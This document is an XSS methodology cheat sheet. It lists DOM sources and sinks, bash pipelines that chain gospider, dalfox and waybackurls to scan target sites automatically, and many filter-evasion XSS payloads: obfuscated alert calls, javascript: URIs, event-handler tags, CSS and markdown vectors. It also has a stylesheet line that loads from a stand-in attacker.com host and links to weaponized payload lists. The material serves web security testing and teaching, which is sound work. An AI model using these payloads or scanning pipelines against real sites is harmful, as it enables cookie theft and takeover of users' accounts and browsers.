# XSS Methodology

- Credits
  - [Somedev Sangwan](https://github.com/s0md3v) for the awesome tips and tricks.
  - [domxsswiki](https://github.com/wisec/domxsswiki) for the awesome list of sinks and sources.

---

## Table of contents

- [Manual approach](#manual-approach)
- [Automated approach](#automated-approach)
- [Filter Evasion](#filter-evasion)
- [Resources](#resources)

---

## Manual approach

- Sources
```
document.URL
document.documentURI
document.URLUnencoded (IE 5.5 or later Only)
document.baseURI
location
location.href
location.search
location.hash
location.pathname
document.cookie
document.referrer
window.name
history.pushState()
history.replaceState()
localStorage
sessionStorage
```

- Sinks
```
eval
Function
setTimeout
setInterval
setImmediate
execScript
crypto.generateCRMFRequest
ScriptElement.src
ScriptElement.text
ScriptElement.textContent
ScriptElement.innerText
anyTag.onEventName
document.write
document.writeln
anyElement.innerHTML
Range.createContextualFragment
window.location
document.location
```

- Q: How to identify sinks and sources?
- A: Use the browser extension [Untrusted Types](https://github.com/filedescriptor/untrusted-types) by filedescriptor.

- Tips and Tricks @s0md3v
  - http(s):// can be shortened to // or /\\ or \\.
  - document.cookie can be shortened to cookie. It applies to other DOM objects as well.
  - alert and other pop-up functions don't need a value, so stop doing alert('XSS') and start doing alert()
  - You can use // to close a tag instead of >.
  - I have found that confirm is the least detected pop-up function so stop using alert.
  - Quotes around attribute value aren't necessary as long as it doesn't contain spaces. You can use <script src=//14.rs> instead of <script src="//14.rs">
  - The shortest HTML context XSS payload is <script src=//14.rs> (19 chars)

---

## Automated approach

- Scanning XSS from host / from @cihanmehmet 
```bash
gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt
```

- Automating XSS using Dalfox, Gf and Waybackurls / from @theinfosecguy
```bash
cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours-xss-hunter-domain(e.g yours.xss.ht)
```

- XSS without Gf / from @HacktifyS
```bash
waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```

---

## Filter Evasion

- Pass malicious input without sending it to the server / from @tomnomnom

```
https://example.com/?poc=alert(location.hash(substr(1)))#someting-very-malicious-hidden-inside-the-hash
```

- Alert obfuscation / from @owasp

```
(alert)(1)
a=alert,a(1)
[1].find(alert)
top[“al”+”ert”](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top[‘al\145rt’](1)
top[‘al\x65rt’](1)
top[8680439..toString(30)](1)
alert?.()
```

- HTML entities 

```
javascript:confirm(&quot;freetext&quot;)
```

- Embeded newline

```
jav&#x0AA;ascript:confirm()
```


- Embedded tab

```
jav   ascript:confirm()
jav%09ascript:confirm()
jav&#x09;ascript:confirm()
```


- Grave accent obfuscation

```markup
javascript:confirm``
```


* Using the transition event

```markup
<style>:target {color: red;}</style>
<div id=x style="transition: color 1s" ontransitionstart=confirm(1)></div>
```

* Malformed anchor tag

```markup
\<a onmouseover="confirm(document.cookie)"\>click\</a\>
```

* Malformed IMG tags

```markup
<img """><script>confirm(1)</script"\>
```

* Using the fromCharCode\(\) method

```markup
<img src=javascript:confirm(String.fromCharCode(88,83,83))>
```

* Exploiting the bgsound tag

```markup
<bgsound src="javascript:confirm(1);">
```

* Remote style sheet

```markup
<link rel="stylesheet" href="http://attacker.com/xss.css" />
```

* Inside the meta tag content

```markup
<meta http-equiv="refresh" content="0;url=javascript:confirm(1);">
```

* iFrame source

```markup
<iframe src="javascript:confirm(1);"></iframe>
```

* Decimal HTML character references

```markup
<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

* Input of type image

```markup
<input type="image" src="javascript:confirm()">
```

* Half open HTML/Javascript

```markup
<img src="`<javascript:confirm`>()"
```

* Extraneous open brackets

```markup
<<script> confirm() //\<</script>
```

---

## CSS XSS

```css
li { list-style-image: url("javascript:confirm()");}
* { background-image: url("javascript:confirm()");}
```

---

## Markdown XSS

- Hyperlink

```
[a](javascript:confirm())
```

- Image

```
![img](javascript:confirm())
![img]("onerror="confirm())
![img](http://www.example.com/example.jpg"onload="confirm())
![img](data:text/html;base64,PHNjcmlwdD5jb25maXJtKCk8L3NjcmlwdD4)\
```

## Some less common attributes

- img

```
lowsrc
dynsrc
```

---

## Resources
- Blogs
  - https://brutelogic.com.br/blog/xss101/
- XSS test beds and challenges
  - [Google's Firing Range](https://public-firing-range.appspot.com/)
  - [prompt.ml](https://prompt.ml/)
  - [xss-game](https://xss-game.appspot.com/)
  - [polyglot](https://web.archive.org/web/20190617111911/https://polyglot.innerht.ml/)
- Amazing tools
  - [XSSHunter](https://xsshunter.com/)
  - [QuickXSS](https://github.com/theinfosecguy/QuickXSS)
  - [XSStrike](https://github.com/s0md3v/XSStrike)
- XSS weaponized payloads
  - [xss-payloads](http://www.xss-payloads.com/payloads-list.html?a#category=all)
  - [weaponized-xss-payloads](https://github.com/hakluke/weaponised-XSS-payloads)
